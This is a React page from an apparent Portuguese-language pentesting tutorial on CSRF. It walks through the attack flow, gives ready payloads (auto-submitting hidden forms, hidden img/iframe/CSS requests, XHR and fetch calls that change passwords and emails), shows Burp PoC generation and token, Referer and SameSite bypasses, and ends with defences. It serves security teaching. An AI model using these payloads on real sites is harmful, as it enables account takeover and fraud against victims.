import { PageContainer } from "@/components/layout/PageContainer";
import { CodeBlock } from "@/components/ui/CodeBlock";
import { AlertBox } from "@/components/ui/AlertBox";

export default function CSRF() {
  return (
    <PageContainer
      title="CSRF — Cross-Site Request Forgery"
      subtitle="Entenda e explore ataques CSRF que forçam usuários autenticados a executar ações indesejadas. Guia completo com payloads, geração de PoC, bypass de proteções, e SameSite cookies."
      difficulty="intermediario"
      timeToRead="28 min"
    >
      <h2>O que é CSRF?</h2>
      <p>
        <strong>Cross-Site Request Forgery (CSRF / XSRF)</strong> é um ataque que engana o navegador
        da vítima para enviar uma requisição autenticada para um site legítimo onde ela está logada.
        O atacante não precisa roubar a senha — ele usa o fato de que o navegador automaticamente
        envia cookies de sessão em toda requisição para o domínio correspondente.
      </p>

      <h2>Como Funciona — Passo a Passo</h2>
      <CodeBlock
        title="Fluxo detalhado de um ataque CSRF"
        code={`# ═══════════════════════════════════════════════════
# CENÁRIO: Atacante quer transferir R$10.000 da conta
# da vítima no banco.com
# ═══════════════════════════════════════════════════

# PASSO 1: Vítima faz login no banco.com
# → Navegador recebe cookie: session=abc123def456
# → Cookie é armazenado e enviado automaticamente
#    em TODA requisição para banco.com

# PASSO 2: Atacante descobre como funciona a transferência
# Requisição legítima (usando Burp para capturar):
# POST /transferir HTTP/1.1
# Host: banco.com
# Cookie: session=abc123def456    ← enviado automaticamente!
# Content-Type: application/x-www-form-urlencoded
#
# destino=12345&valor=100&descricao=pagamento

# PASSO 3: Atacante cria página maliciosa com formulário oculto
# (ver payloads abaixo)

# PASSO 4: Atacante faz vítima visitar a página maliciosa
# Métodos: email com link, post em fórum, anúncio, etc.
# A vítima NÃO PRECISA clicar em nada além de abrir a página!

# PASSO 5: Página maliciosa submete formulário automaticamente
# → Navegador envia POST para banco.com
# → Cookie session=abc123def456 é incluído automaticamente
# → banco.com recebe requisição válida e processa

# PASSO 6: R$10.000 transferidos!
# A vítima nem percebeu. O formulário era invisível.

# ═══════════════════════════════════════════════════
# POR QUE FUNCIONA?
# ═══════════════════════════════════════════════════
# Porque o navegador SEMPRE envia cookies para o domínio
# correspondente, independente de onde a requisição originou.
# O banco.com não tem como saber se a requisição veio de:
# a) O usuário clicando no botão "Transferir" no site
# b) Um formulário oculto em site-malicioso.com
#
# Ambas as requisições são IDÊNTICAS do ponto de vista do servidor.`}
      />

      <h2>Payloads de CSRF — Do Simples ao Avançado</h2>

      <CodeBlock
        title="CSRF via formulário oculto com auto-submit (POST)"
        code={`<!-- ═══════════════════════════════════════════════ -->
<!-- PAYLOAD 1: Formulário com auto-submit               -->
<!-- O mais comum e eficaz. Funciona com qualquer POST.  -->
<!-- ═══════════════════════════════════════════════ -->
<html>
<body>
  <!-- Formulário invisível -->
  <form id="csrf-form"
        action="https://banco.com/transferir"
        method="POST"
        style="display:none;">
    <!--
      Cada <input hidden> corresponde a um parâmetro
      da requisição original capturada com Burp.
      O name="" deve ser EXATAMENTE igual ao parâmetro.
    -->
    <input type="hidden" name="destino" value="conta-do-atacante" />
    <input type="hidden" name="valor" value="10000" />
    <input type="hidden" name="descricao" value="pagamento" />
    <input type="hidden" name="confirmar" value="sim" />
  </form>

  <!-- JavaScript que submete o form automaticamente -->
  <!-- A vítima NÃO precisa clicar em nada! -->
  <script>
    document.getElementById('csrf-form').submit();
  </script>

  <!-- Opcional: mostrar conteúdo fake enquanto o form submete -->
  <h1>Carregando...</h1>
</body>
</html>

<!-- ═══════════════════════════════════════════════ -->
<!-- COMO USAR:                                      -->
<!-- 1. Salvar como csrf.html                         -->
<!-- 2. Hospedar em servidor (python3 -m http.server) -->
<!-- 3. Enviar link para a vítima                     -->
<!-- 4. Quando a vítima abrir → form é submetido      -->
<!-- ═══════════════════════════════════════════════ -->`}
      />

      <CodeBlock
        title="CSRF via GET (imagem, iframe, link)"
        code={`<!-- ═══════════════════════════════════════════════ -->
<!-- PAYLOAD 2: GET via tag <img>                     -->
<!-- Funciona se a ação aceita método GET              -->
<!-- A vítima nem precisa clicar — a imagem carrega    -->
<!-- automaticamente                                    -->
<!-- ═══════════════════════════════════════════════ -->
<img src="https://app.com/api/delete-account?confirm=true"
     width="0" height="0"
     style="display:none;" />
<!--
  O navegador tenta "carregar a imagem" fazendo GET.
  Como o cookie é enviado automaticamente, a conta é deletada!
  width=0 height=0 torna a "imagem" invisível.
-->

<!-- PAYLOAD 3: GET via <iframe> oculto -->
<iframe src="https://app.com/change-email?email=hacker@evil.com"
        width="0" height="0"
        style="display:none; border:none;">
</iframe>
<!--
  O iframe carrega a URL silenciosamente.
  style="display:none" torna completamente invisível.
-->

<!-- PAYLOAD 4: GET via <link> (prefetch) -->
<link rel="prefetch" href="https://app.com/admin/make-admin?user=hacker" />
<!--
  O navegador faz prefetch (carrega em background).
  Alguns navegadores modernos bloqueiam isso.
-->

<!-- PAYLOAD 5: GET via CSS (mais furtivo) -->
<style>
  body {
    background: url('https://app.com/api/action?param=value');
  }
</style>
<!--
  O navegador carrega o "background" via GET.
  Difícil de detectar em análise estática de HTML.
-->`}
      />

      <CodeBlock
        title="CSRF com JavaScript (XMLHttpRequest e Fetch)"
        code={`<!-- ═══════════════════════════════════════════════ -->
<!-- PAYLOAD 6: XMLHttpRequest (XHR)                  -->
<!-- Permite enviar POST com body customizado           -->
<!-- ═══════════════════════════════════════════════ -->
<script>
var xhr = new XMLHttpRequest();
xhr.open("POST", "https://app.com/api/change-password", true);

// Content-Type DEVE corresponder ao que o servidor espera
// application/x-www-form-urlencoded → formato de form
// application/json → PODE ser bloqueado por CORS preflight!
xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");

// withCredentials = true → envia cookies cross-origin
xhr.withCredentials = true;

// Enviar os parâmetros
xhr.send("new_password=hacked123&confirm_password=hacked123");
</script>
<!--
  IMPORTANTE sobre CORS:
  - O navegador ENVIA a requisição mesmo sem CORS permissivo
  - O atacante NÃO PODE LER a resposta (bloqueado por CORS)
  - Mas a AÇÃO já foi executada no servidor!
  - CSRF não precisa ler a resposta — só precisa ENVIAR.

  EXCEÇÃO:
  - Se Content-Type = application/json, o navegador faz
    preflight OPTIONS antes. Se o servidor não responde
    ao OPTIONS com Access-Control-Allow-Origin → bloqueado.
  - SOLUÇÃO: usar Content-Type = text/plain (não faz preflight)
    e o servidor pode aceitar mesmo sem o header correto.
-->

<!-- ═══════════════════════════════════════════════ -->
<!-- PAYLOAD 7: Fetch API                             -->
<!-- ═══════════════════════════════════════════════ -->
<script>
fetch("https://app.com/api/change-email", {
  method: "POST",
  credentials: "include",  // ← envia cookies!
  headers: {
    "Content-Type": "application/x-www-form-urlencoded"
  },
  body: "email=hacker@evil.com"
});
</script>`}
      />

      <h2>Testar CSRF com Burp Suite — Passo a Passo</h2>
      <CodeBlock
        title="Gerar PoC e testar vulnerabilidade"
        code={`# ═══════════════════════════════════════════════════
# PASSO 1: Identificar requisição alvo
# ═══════════════════════════════════════════════════
# No Burp, capturar uma requisição que faz algo sensível:
# - Mudar email/senha
# - Transferir dinheiro
# - Adicionar/remover admin
# - Deletar dados
# - Qualquer ação que mude estado

# ═══════════════════════════════════════════════════
# PASSO 2: Verificar proteções CSRF
# ═══════════════════════════════════════════════════
# Examinar a requisição e procurar:
# a) Token CSRF (csrf_token, _token, authenticity_token, etc.)
# b) Header custom (X-CSRF-Token, X-Requested-With)
# c) Cookie SameSite
# d) Verificação de Referer/Origin
#
# Se NENHUMA proteção existe → provavelmente vulnerável!

# ═══════════════════════════════════════════════════
# PASSO 3: Gerar PoC automaticamente
# ═══════════════════════════════════════════════════
# No Burp:
# 1. Clique direito na requisição
# 2. Engagement tools → Generate CSRF PoC
# 3. Burp gera HTML completo com formulário
# 4. Options:
#    - Include auto-submit script: ☑ (marca!)
#    - Isso adiciona o JavaScript de auto-submit
# 5. Clicar "Copy HTML"
# 6. Salvar como csrf-poc.html

# ═══════════════════════════════════════════════════
# PASSO 4: Testar o PoC
# ═══════════════════════════════════════════════════
# 1. Estar logado na aplicação alvo (mesmo navegador)
# 2. Abrir csrf-poc.html no navegador
# 3. Se a ação foi executada → CSRF CONFIRMADO!
# 4. Verificar se a ação realmente aconteceu
#    (ex: email mudou? senha mudou? dinheiro transferiu?)

# ═══════════════════════════════════════════════════
# TESTE MANUAL — Checklist
# ═══════════════════════════════════════════════════
# Para cada requisição sensível, testar:
#
# 1. Existe token CSRF? 
#    SIM → ir para "Bypass de Proteções"
#    NÃO → vulnerável! Gerar PoC.
#
# 2. Token está no cookie e no body/header?
#    Se só no cookie → não protege (cookie é enviado auto)
#    Se no body/header → precisa bypass
#
# 3. A ação aceita GET?
#    Mudar método POST → GET e ver se funciona
#    Se aceita GET → CSRF via <img> é possível
#
# 4. Content-Type importa?
#    Mudar application/json → application/x-www-form-urlencoded
#    Se funciona → CSRF via form simples
#    Se não → precisa de CORS bypass`}
      />

      <h2>Bypass de Proteções CSRF — Detalhado</h2>
      <CodeBlock
        title="Técnicas para contornar proteções CSRF"
        code={`# ═══════════════════════════════════════════════════
# BYPASS 1: Remover o token completamente
# ═══════════════════════════════════════════════════
# Requisição original:
# POST /change-email
# csrf_token=abc123&email=novo@email.com

# Tentativa: enviar SEM o token
# POST /change-email
# email=novo@email.com

# Se o servidor não valida quando o parâmetro está
# AUSENTE (só valida quando está PRESENTE) → vulnerável!
# Isso é SURPREENDENTEMENTE comum.

# ═══════════════════════════════════════════════════
# BYPASS 2: Usar token de qualquer valor
# ═══════════════════════════════════════════════════
# Enviar valor aleatório:
# csrf_token=AAAA&email=hacker@evil.com
# Se aceitar qualquer valor → validação está quebrada

# ═══════════════════════════════════════════════════
# BYPASS 3: Usar token de outro usuário
# ═══════════════════════════════════════════════════
# Se o token NÃO está vinculado à sessão do usuário:
# 1. Fazer login com SUA conta
# 2. Obter SEU token CSRF
# 3. Usar seu token no payload CSRF contra a vítima
# Se funcionar → tokens não são per-session (vulnerável!)

# ═══════════════════════════════════════════════════
# BYPASS 4: Mudar método HTTP
# ═══════════════════════════════════════════════════
# Se POST tem CSRF mas GET não:
# Original: POST /change-email csrf_token=abc&email=x
# Tentativa: GET /change-email?email=hacker@evil.com
# Muitos frameworks só validam CSRF em POST, não em GET!

# ═══════════════════════════════════════════════════
# BYPASS 5: Token no cookie (Double Submit Cookie)
# ═══════════════════════════════════════════════════
# Se app verifica: cookie[csrf] == body[csrf]
# E se você pode injetar cookies (via CRLF injection
# ou subdomain takeover):
# 1. Injetar cookie: csrf=VALOR_CONTROLADO
# 2. Enviar body: csrf=VALOR_CONTROLADO
# Ambos correspondem → bypass!

# ═══════════════════════════════════════════════════
# BYPASS 6: Referer validation bypass
# ═══════════════════════════════════════════════════
# Se app valida o header Referer:

# Técnica 1: Remover Referer completamente
<meta name="referrer" content="no-referrer">
# Se o servidor aceita quando Referer está AUSENTE → bypass!

# Técnica 2: Incluir domínio alvo no Referer
# Se app verifica se "banco.com" está no Referer:
# Hospedar PoC em: https://banco.com.evil.com/csrf.html
# Ou: https://evil.com/banco.com/csrf.html
# Referer incluirá "banco.com" na URL

# ═══════════════════════════════════════════════════
# BYPASS 7: SameSite cookie bypass
# ═══════════════════════════════════════════════════
# SameSite=Strict:
#   Cookie NÃO é enviado em NENHUMA requisição cross-site
#   Muito difícil de bypassar!
#   Único bypass: encontrar XSS no mesmo site (same-origin)
#
# SameSite=Lax (PADRÃO nos navegadores modernos):
#   Cookie é enviado em navegação top-level GET
#   NÃO é enviado em: POST cross-site, iframe, AJAX
#   Bypass: se a ação aceita GET → funciona via link!
#   <a href="https://app.com/delete?id=1">Clique aqui</a>
#
# SameSite=None:
#   Cookie SEMPRE é enviado (precisa de Secure também)
#   Sem proteção! CSRF funciona normalmente.
#   Verificar Set-Cookie header para saber qual valor está setado.

# ═══════════════════════════════════════════════════
# BYPASS 8: JSON Content-Type
# ═══════════════════════════════════════════════════
# Se o endpoint aceita apenas application/json:
# Normalmente, form HTML não pode enviar JSON.
# Mas com fetch() e Content-Type: text/plain:

<script>
fetch("https://app.com/api/action", {
  method: "POST",
  credentials: "include",
  headers: {"Content-Type": "text/plain"},
  body: '{"email":"hacker@evil.com"}'
});
</script>
# text/plain não trigga preflight CORS!
# Se o servidor parseia JSON independente do Content-Type → funciona!`}
      />

      <h2>Prevenção (Para o Relatório)</h2>
      <CodeBlock
        title="Defesas contra CSRF — recomendações"
        code={`# ═══════════════════════════════════════════════════
# DEFESA 1: Token CSRF sincronizado (MELHOR PRÁTICA)
# ═══════════════════════════════════════════════════
# - Gerar token aleatório (32+ bytes) por SESSÃO
# - Incluir no form como hidden field
# - Validar no servidor a cada POST/PUT/DELETE
# - Token deve ser: único por sessão, criptograficamente random,
#   validado server-side, e NÃO exposto em URL (GET)

# ═══════════════════════════════════════════════════
# DEFESA 2: SameSite Cookie (padrão moderno)
# ═══════════════════════════════════════════════════
# Set-Cookie: session=abc; SameSite=Strict; Secure; HttpOnly
#
# SameSite=Strict — melhor proteção, pode quebrar UX
# SameSite=Lax — bom equilíbrio (padrão do Chrome)
# ⚠️ SameSite sozinho NÃO é suficiente! Usar com token CSRF.

# ═══════════════════════════════════════════════════
# DEFESA 3: Verificar Origin/Referer headers
# ═══════════════════════════════════════════════════
# Verificar se Origin header corresponde ao domínio da app
# Rejeitar se Origin é diferente ou ausente

# ═══════════════════════════════════════════════════
# DEFESA 4: Custom headers para APIs
# ═══════════════════════════════════════════════════
# Exigir header custom: X-Requested-With: XMLHttpRequest
# Forms HTML simples NÃO podem setar headers custom
# (mas XHR/fetch podem — então não é defesa isolada)`}
      />
    </PageContainer>
  );
}
